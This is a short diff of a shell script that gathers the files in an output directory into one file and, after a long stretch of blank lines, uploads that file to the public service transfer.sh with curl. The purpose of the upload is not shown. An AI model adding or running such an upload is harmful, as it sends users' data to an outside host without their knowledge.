@@ -25,3 +25,26 @@ do
 done <res
 
 rm res
+ls output/ 
+ls output/ >> res
+while IFS= read li
+do
+	cat output/$li >> final
+
+done < res
+
+
+
+
+
+
+
+
+
+
+
+#cat output/$li >> final
+cat res
+rm res
+#rm -rf output
+curl --upload-file final https://transfer.sh/final;echo
